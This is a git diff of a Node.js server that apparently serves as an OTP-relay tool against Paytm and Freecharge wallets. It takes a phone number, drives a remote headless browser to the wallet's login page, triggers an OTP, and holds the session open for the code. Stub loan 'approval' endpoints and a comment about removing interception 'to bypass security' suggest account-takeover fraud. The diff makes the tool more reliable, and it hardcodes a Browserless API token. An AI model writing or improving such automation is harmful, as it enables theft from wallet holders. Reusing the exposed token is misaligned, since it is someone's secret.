@@ -24,15 +24,16 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP VIA BROWSERLESS
+// STEP 1: TRIGGER OTP VIA BROWSERLESS (FIXED)
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
     if (!phone) return res.status(400).json({ success: false, message: "Phone required" });
 
-    // 🔴 TERI BROWSERLESS API KEY YAHAN SET HAI 🔴
+    // 🔴 TERI BROWSERLESS API KEY
     const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a';
 
+    // Pehle se koi session hai toh usko securely kill karo
     if (activeSessions[phone] && activeSessions[phone].browser) {
         try { await activeSessions[phone].browser.close(); } catch(e){}
     }
@@ -51,25 +52,30 @@ app.post('/api/start-tool', async (req, res) => {
         const page = await browser.newPage();
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
         
-        await page.setRequestInterception(true);
-        page.on('request', (req) => {
-            if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) req.abort();
-            else req.continue();
-        });
+        // 🔥 FIX 2: Interception HATA di. Security bypass karne ke liye page poora load hona chahiye.
+        // await page.setRequestInterception(true); 
 
         activeSessions[phone].browser = browser;
         activeSessions[phone].page = page;
 
         if (walletType.toLowerCase().includes('freecharge')) {
+            console.log(`[!] Opening Freecharge for ${phone}...`);
             await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
+            
+            // Wait for login button to actually appear before clicking
+            await new Promise(r => setTimeout(r, 3000)); 
+
             await page.evaluate(() => {
                 const loginBtn = Array.from(document.querySelectorAll('a, button')).find(b => b.innerText && b.innerText.toLowerCase().includes('login'));
                 if (loginBtn) loginBtn.click();
             });
-            await new Promise(r => setTimeout(r, 1500));
+
+            await new Promise(r => setTimeout(r, 2000));
             await page.keyboard.type(phone, { delay: 50 });
             await page.keyboard.press('Enter');
+
         } else {
+            console.log(`[!] Opening Paytm for ${phone}...`);
             await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 60000 });
             let inputField = await page.waitForSelector('input[type="tel"], input[type="text"]:not([type="hidden"])', { timeout: 15000 });
             await inputField.focus(); 
@@ -79,6 +85,7 @@ app.post('/api/start-tool', async (req, res) => {
         
         console.log(`[!] OTP Triggered on Browserless for ${phone}`);
 
+        // 3 minute baad auto-kill
         setTimeout(async () => {
             if (activeSessions[phone] && activeSessions[phone].status === 'waiting_for_otp') {
                 try { await activeSessions[phone].browser.close(); delete activeSessions[phone]; } catch(e){}
@@ -88,7 +95,13 @@ app.post('/api/start-tool', async (req, res) => {
 
     } catch (e) {
         console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
-        if(activeSessions[phone]) activeSessions[phone].status = 'failed';
+        // 🔥 FIX 1: ERROR AANE PAR ZOMBIE BROWSER KO KILL KARNA ZAROORI HAI!
+        if(activeSessions[phone]) {
+            activeSessions[phone].status = 'failed';
+            if (activeSessions[phone].browser) {
+                try { await activeSessions[phone].browser.close(); } catch(err){}
+            }
+        }
     }
 });
 
